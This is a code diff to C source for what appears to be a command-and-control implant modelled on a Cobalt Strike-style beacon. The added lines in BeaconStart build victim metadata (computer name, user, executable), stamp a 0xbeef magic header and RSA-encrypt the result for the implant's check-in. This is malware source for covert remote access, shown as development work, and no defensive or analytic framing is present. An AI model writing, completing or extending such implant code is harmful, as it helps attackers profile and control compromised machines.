@@ -152,9 +152,12 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 					if ((Ins.BeaconId = RandomNumber32( &Ins )) != 0)
 					{
 						PBEACON_METADATA_HDR Met = 0;
+						PBEACON_METADATA_HDR Hdr = 0;
+						PVOID                Ecp = 0;
 						PVOID                Cmp = 0;
 						PVOID                Usr = 0;
 						PVOID                Exe = 0;
+						ULONG                Ecl = 0;
 
 						if ((Cmp = BeaconComputer( &Ins )))
 						{
@@ -183,6 +186,17 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 									Met = BufferAddUI1( &Ins, Met, '\t' );
 									Met = BufferAddRaw( &Ins, Met, Exe, strlen( Exe ) );
 
+									if ((Hdr = Ins.api.LocalLock( Met )))
+									{
+										Hdr->uMagic = 0x0000beef;
+										Hdr->Length = Ins.api.LocalSize( Met ) - 8;
+
+										if ( CryptRsaEncrypt( &Ins, Hdr, Hdr->Length + 8, &Ecp, &Ecl ))
+										{
+											Ins.api.LocalFree( Ecp );
+										};
+										Ins.api.LocalUnlock( Met );
+									};
 									Ins.api.LocalFree( Exe );
 									Ins.api.LocalFree( Met );
 								};
